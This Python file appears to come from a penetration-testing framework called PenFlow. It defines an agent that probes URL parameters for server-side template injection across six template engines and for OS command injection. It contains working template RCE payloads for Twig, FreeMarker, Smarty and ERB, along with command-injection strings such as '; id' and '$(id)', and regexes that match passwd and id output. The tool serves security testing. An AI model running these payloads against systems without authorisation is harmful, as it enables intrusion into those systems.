"""
SSTIRCECapabilityAgent — Multi-Engine SSTI & OS Command Execution Agent for PenFlow.

Engine Payload Matrix:
  - Jinja2 (Python): {{1337*7}} → 9359, {{7*'7'}} → 7777777
  - Twig (PHP): {{79*83}} → 6557, {{_self.env.registerUndefinedFilterCallback("exec")}}
  - FreeMarker (Java): ${79*83} → 6557, <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
  - Smarty (PHP): {79*83} → 6557, {system('id')}
  - ERB (Ruby): <%= 79*83 %> → 6557, <%= `id` %>
  - Velocity (Java): #set($x=79*83)$x → 6557

Features:
  - Dynamic mathematical baseline comparison to prevent static number reflection false positives
  - Verbatim probe reflection exclusion
  - Process output signature extraction
"""
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.ssti_rce")

# Multi-engine SSTI evaluation matrix with distinct prime multipliers
SSTI_ENGINE_PAYLOADS = [
    {
        "engine": "Jinja2 (Python)",
        "probe": "{{1337*7}}",
        "expected_output": "9359",
        "severity": "critical"
    },
    {
        "engine": "Jinja2 String Polyglot (Python)",
        "probe": "{{7*'7'}}",
        "expected_output": "7777777",
        "severity": "critical"
    },
    {
        "engine": "Twig (PHP)",
        "probe": "{{79*83}}",
        "expected_output": "6557",
        "severity": "critical"
    },
    {
        "engine": "FreeMarker (Java)",
        "probe": "${79*83}",
        "expected_output": "6557",
        "severity": "critical"
    },
    {
        "engine": "Smarty (PHP)",
        "probe": "{79*83}",
        "expected_output": "6557",
        "severity": "critical"
    },
    {
        "engine": "ERB (Ruby)",
        "probe": "<%= 79*83 %>",
        "expected_output": "6557",
        "severity": "critical"
    },
    {
        "engine": "Velocity (Java)",
        "probe": "#set($x=79*83)$x",
        "expected_output": "6557",
        "severity": "high"
    },
]

# OS Command Injection Payloads
RCE_PAYLOADS = [
    "; id",
    "| id",
    "& id",
    "`id`",
    "$(id)",
    "\nid",
    "& whoami",
    "; whoami",
]

RCE_OUTPUT_PATTERNS = [
    r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)",  # Linux id output
    r"root:x:0:0:",                         # passwd read
    r"windows\s+ip\s+configuration",        # ipconfig output
    r"volume\s+in\s+drive\s+[a-z]\s+has\s+no\s+label", # dir output
]


class SSTIRCECapabilityAgent(BaseCapabilityAgent):
    """
    Elite SSTI & OS Command Injection Specialist Agent.
    Identifies template engines via mathematical evaluation signatures and escalates to RCE.
    """
    def __init__(self, priority: int = 10):
        super().__init__(agent_name="SSTIRCECapabilityAgent", priority=priority)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="ssti_analysis",
                name="Server-Side Template Injection (SSTI Multi-Engine)",
                description="Tests dynamic rendering parameters against Jinja2, Twig, FreeMarker, Smarty, ERB, and Velocity engines",
                priority=self.priority,
                tags=["ssti", "template", "rce", "jinja2", "twig", "freemarker"]
            ),
            Capability(
                id="command_injection",
                name="OS Command Injection / Arbitrary Execution",
                description="Tests parameters for shell command separators, command substitution, and process execution",
                priority=self.priority,
                tags=["rce", "command_injection", "system", "os"]
            ),
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[SSTIRCECapabilityAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        targets = self._collect_targets(context)

        findings: List[Dict[str, Any]] = []

        for target in targets[:8]:
            if capability_id == "ssti_analysis":
                result = await self._test_ssti(http_client, target)
            else:
                result = await self._test_rce(http_client, target)

            if result:
                findings.append(result)
                if result.get("is_vulnerable") and result.get("confidence", 0) >= 0.90:
                    break

        confirmed = [f for f in findings if f.get("is_vulnerable")]
        is_vuln = len(confirmed) > 0
        best = confirmed[0] if confirmed else (findings[0] if findings else {})

        return {
            "status": "COMPLETED",
            "agent": self.name,
            "capability": capability_id,
            "asset": context.asset,
            "is_vulnerable": is_vuln,
            "confidence_score": best.get("confidence", 0.0),
            "reasoning": best.get("reasoning", "Template/command injection not detected on tested parameters."),
            "target_url": best.get("target_url", f"https://{context.asset}"),
            "findings": findings,
            "evidence": {
                "target_url": best.get("target_url", f"https://{context.asset}"),
                "engine": best.get("engine", ""),
                "tested_endpoints_count": len(targets),
                "reasoning": best.get("reasoning", "Template/command injection not detected on tested parameters."),
                "findings": findings,
                "evidence_exchanges": [f.get("exchange", {}) for f in findings if f.get("exchange")]
            }
        }

    def _collect_targets(self, context: CapabilityExecutionContext) -> List[Dict[str, Any]]:
        targets = []
        seen = set()

        for data in context.get_observation_data():
            if isinstance(data, dict):
                if "endpoints" in data and isinstance(data["endpoints"], list):
                    for ep in data["endpoints"]:
                        if isinstance(ep, dict) and ep.get("url"):
                            url = ep["url"]
                            parsed = urlparse(url)
                            q_params = list(parse_qs(parsed.query).keys())
                            if url not in seen and q_params:
                                targets.append({"url": url, "params": q_params})
                                seen.add(url)
                elif "url" in data and data["url"]:
                    url = data["url"]
                    parsed = urlparse(url)
                    q_params = list(parse_qs(parsed.query).keys())
                    if url not in seen and q_params:
                        targets.append({"url": url, "params": q_params})
                        seen.add(url)

        if not targets:
            base = f"https://{context.asset}"
            targets.append({"url": f"{base}/search?q=test", "params": ["q"]})
            targets.append({"url": f"{base}/render?msg=hello", "params": ["msg"]})
            targets.append({"url": f"{base}/preview?template=test", "params": ["template"]})

        return targets

    async def _test_ssti(self, http_client: Any, target: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        base_url = target["url"]
        param = target["params"][0]
        parsed = urlparse(base_url)

        # Baseline request to ensure expected numbers aren't already naturally on page
        try:
            exch_base = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="GET",
                url=base_url
            )
            base_body = (exch_base.response.body_text or "") if exch_base.response else ""
        except Exception:
            base_body = ""

        for engine_item in SSTI_ENGINE_PAYLOADS:
            probe = engine_item["probe"]
            expected = engine_item["expected_output"]

            # If expected number was already on the page naturally, skip to prevent false positives
            if expected in base_body:
                continue

            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [probe]
            inj_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

            try:
                exch = await http_client.send_as_identity(
                    identity_id="anonymous_guest",
                    method="GET",
                    url=inj_url
                )
                resp = exch.response
                if resp and resp.status_code == 200 and resp.body_text:
                    body = resp.body_text
                    # Robust verification: Evaluated result present AND raw template syntax NOT reflected verbatim
                    if expected in body and probe not in body:
                        return {
                            "vector": "ssti_evaluation",
                            "engine": engine_item["engine"],
                            "target_url": inj_url,
                            "param_name": param,
                            "is_vulnerable": True,
                            "confidence": 0.99,
                            "reasoning": f"CRITICAL SSTI ({engine_item['engine']}): Dynamic math expression '{probe}' evaluated to '{expected}' in response body (absent in baseline).",
                            "exchange": exch.to_dict()
                        }
            except Exception as e:
                logger.debug(f"[SSTIRCEAgent] SSTI probe error for {engine_item['engine']}: {e}")

        return None

    async def _test_rce(self, http_client: Any, target: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        base_url = target["url"]
        param = target["params"][0]
        parsed = urlparse(base_url)

        for payload in RCE_PAYLOADS:
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [f"test{payload}"]
            inj_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

            try:
                exch = await http_client.send_as_identity(
                    identity_id="anonymous_guest",
                    method="GET",
                    url=inj_url
                )
                resp = exch.response
                if resp and resp.body_text:
                    body = resp.body_text
                    for pattern in RCE_OUTPUT_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            return {
                                "vector": "os_command_injection",
                                "target_url": inj_url,
                                "param_name": param,
                                "is_vulnerable": True,
                                "confidence": 0.99,
                                "reasoning": f"CRITICAL OS Command Injection: Payload '{payload}' returned process execution output matching '{pattern}'.",
                                "exchange": exch.to_dict()
                            }
            except Exception as e:
                logger.debug(f"[SSTIRCEAgent] RCE probe error: {e}")

        return None
